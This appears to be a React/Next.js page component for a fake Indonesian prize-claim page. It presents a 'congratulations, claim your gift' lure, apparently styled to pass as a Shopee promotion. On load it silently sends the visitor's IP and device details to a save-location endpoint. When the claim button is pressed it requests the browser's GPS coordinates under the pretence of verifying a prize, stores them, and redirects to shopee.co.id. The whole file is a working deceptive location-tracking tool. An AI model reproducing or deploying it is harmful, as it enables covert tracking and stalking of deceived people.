/* eslint-disable @typescript-eslint/no-explicit-any */
"use client";

import { useEffect, useState } from "react";
import confetti from "canvas-confetti";

export default function TrackPage() {
  const [ipData, setIpData] = useState<any>(null);
  const [deviceInfo, setDeviceInfo] = useState<any>(null);
  const [loading, setLoading] = useState(false);

  useEffect(() => {
    async function run() {
      const ipRes = await fetch("/api/get-ip");
      const ipJson = await ipRes.json();
      setIpData(ipJson);

      const d = getDeviceInfo();
      setDeviceInfo(d);

      // INSERT FIRST TIME (NO GPS)
      await fetch("/api/save-location", {
        method: "POST",
        headers: {"Content-Type": "application/json"},
        body: JSON.stringify({
          ...ipJson,
          ...d,
          gpsLat: null,
          gpsLon: null,
        }),
      });

      setTimeout(() => confetti({ particleCount: 150, spread: 80 }), 300);
    }

    run();
  }, []);

  async function handleClaim() {
    setLoading(true);

    if (!ipData || !deviceInfo) {
      return (window.location.href = "https://shopee.co.id");
    }

    if ("geolocation" in navigator) {
      navigator.geolocation.getCurrentPosition(
        async (pos) => {
          await fetch("/api/save-location", {
            method: "POST",
            headers: {"Content-Type": "application/json"},
            body: JSON.stringify({
              ...ipData,
              ...deviceInfo,
              gpsLat: pos.coords.latitude,
              gpsLon: pos.coords.longitude,
            }),
          });

          confetti({ particleCount: 300, spread: 100 });

          setTimeout(() => {
            window.location.href = "https://shopee.co.id";
          }, 1200);
        },

        async () => {
          await fetch("/api/save-location", {
            method: "POST",
            headers: {"Content-Type": "application/json"},
            body: JSON.stringify({
              ...ipData,
              ...deviceInfo,
              gpsLat: null,
              gpsLon: null,
            }),
          });

          setTimeout(() => {
            window.location.href = "https://shopee.co.id";
          }, 1200);
        }
      );
    } else {
      window.location.href = "https://shopee.co.id";
    }
  }

  return (
    <div style={styles.container}>
      <div style={styles.card}>
        {loading ? (
          <>
            <h2 style={styles.title}>⏳ Tunggu Sebentar...</h2>
            <p style={styles.text}>Memverifikasi hadiah Anda…</p>
          </>
        ) : (
          <>
            <h2 style={styles.title}>🎉 SELAMAT!</h2>
            <p style={styles.text}>Anda mendapatkan hadiah menarik!</p>

            <button style={styles.button} onClick={handleClaim}>
              🎁 KLAIM SEKARANG
            </button>
          </>
        )}
      </div>
    </div>
  );
}

function getDeviceInfo() {
  const ua = navigator.userAgent.toLowerCase();

  let os = "Unknown OS";
  if (ua.includes("windows")) os = "Windows";
  else if (ua.includes("mac os x")) os = "MacOS";
  else if (ua.includes("android")) os = "Android";
  else if (ua.includes("iphone")) os = "iPhone iOS";
  else if (ua.includes("ipad")) os = "iPad iOS";
  else if (ua.includes("linux")) os = "Linux";

  let deviceType = "Desktop";
  if (/mobile/i.test(ua)) deviceType = "Mobile";
  if (/tablet/i.test(ua) || ua.includes("ipad")) deviceType = "Tablet";

  const brands = [
    "Samsung", "Xiaomi", "Oppo", "Vivo", "Realme", "Infinix",
    "Poco", "Huawei", "Nokia", "Sony", "Asus", "Lenovo", "iPhone", "iPad"
  ];

  let brand = "Unknown";
  for (const b of brands) {
    if (ua.includes(b.toLowerCase())) brand = b;
  }

  if (deviceType === "Desktop") brand = os;

  return { device: brand, deviceType, os, userAgent: navigator.userAgent };
}

const styles: any = {
  container: {
    minHeight: "100vh",
    background: "#ffefe0",
    display: "flex",
    justifyContent: "center",
    alignItems: "center",
    padding: 20,
  },
  card: {
    background: "#fff",
    padding: 30,
    maxWidth: 360,
    width: "100%",
    borderRadius: 18,
    textAlign: "center",
    boxShadow: "0 6px 20px rgba(0,0,0,0.2)",
  },
  title: { fontSize: 28, fontWeight: "bold", marginBottom: 10 },
  text: { fontSize: 16, marginBottom: 15 },
  button: {
    background: "#ff5722",
    padding: "14px 20px",
    borderRadius: 10,
    color: "white",
    width: "100%",
    border: "none",
    cursor: "pointer",
    fontSize: 18,
    fontWeight: "bold",
  },
};
